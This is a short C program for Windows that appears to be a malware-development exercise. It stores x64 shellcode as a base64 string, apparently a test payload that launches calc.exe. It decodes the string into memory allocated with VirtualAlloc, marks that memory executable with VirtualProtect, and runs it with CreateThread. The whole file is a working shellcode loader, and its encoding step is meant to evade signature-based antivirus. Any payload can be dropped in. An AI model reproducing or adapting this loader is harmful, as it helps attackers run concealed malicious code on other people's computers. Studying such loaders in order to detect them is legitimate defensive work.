#include <Windows.h>
#include <stdio.h>

#pragma comment (lib, "Crypt32.lib")

// certutil -encode calc.bin calc.b64
unsigned char payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
unsigned int payload_len = sizeof(payload);

int DecodeBase64(const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen) {
    DWORD outLen;
    BOOL fRet;

    outLen = dstLen;
    fRet = CryptStringToBinaryA((LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE *)dst, &outLen, NULL, NULL);

    if (!fRet) outLen = 0;

    return outLen;
}

int main(void) {
    void * exec_mem;
    BOOL rv;
    HANDLE hThread;
    DWORD oldprotect = 0;

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // RtlCopyMemory -> Use custom DecodeBase64() function instead

    DecodeBase64((const BYTE *)payload, payload_len, (char *) exec_mem, payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READWRITE, &oldprotect);

    if (rv != 0) {
        hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        WaitForSingleObject(hThread, INFINITE);
    }

    return 0;
}